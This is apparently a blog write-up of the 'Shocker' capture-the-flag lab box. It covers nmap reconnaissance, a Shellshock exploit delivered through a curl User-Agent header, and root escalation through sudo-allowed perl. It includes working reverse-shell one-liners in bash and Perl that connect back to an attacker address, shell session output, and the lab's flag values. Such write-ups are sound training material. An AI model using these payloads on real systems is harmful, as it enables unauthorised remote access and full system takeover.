---
layout: post
title: Shocker
tags: [OSCP, writeup, Linux, shellshock, perl, web, injection]
description: "Shocker write-up"
---

![Shocker logo](/assets/imgs/shocker/shocker.png)

### This is an easy linux box

## Tools used

------

- curl
- find
- nc
- nmap
- perl
- sudo

## Reconnaissance

------

### Nmap

```
nmap -sC -sV -oA shocker 10.10.10.56 -v -Pn

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Exploit

------

```bash
nc -lvp 1234
```

Now execute the exploit.

[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/10.10.14.4/1234 0>&1" http://10.10.10.56/cgi-bin/user.sh
```

```bash
nc -lvp 1234
listening on [any] 1234 ...
10.10.10.56: inverse host lookup failed: Unknown host
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.56] 46792
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
```

So we're not root, let's escale to root !

```bash
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```



```bash
nc -lvp 12345
```

[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.4";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```



```bash
nc -lvp 12345
listening on [any] 12345 ...
10.10.10.56: inverse host lookup failed: Unknown host
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.56] 60392
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

There we have a shell as root ! Go find the flags !
## Flags

------

### User.txt

```bash
shelly@Shocker:/usr/lib/cgi-bin$ find /home -name user.txt
find /home -name user.txt
/home/shelly/user.txt
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
cat /home/shelly/user.txt
2ec24e11320026d1e70ff3e16695b233
```

### Root.txt

```bash
# find / -name root.txt
/root/root.txt
# cat /root/root.txt
52c2715605d70c7619030560dc1ca467
```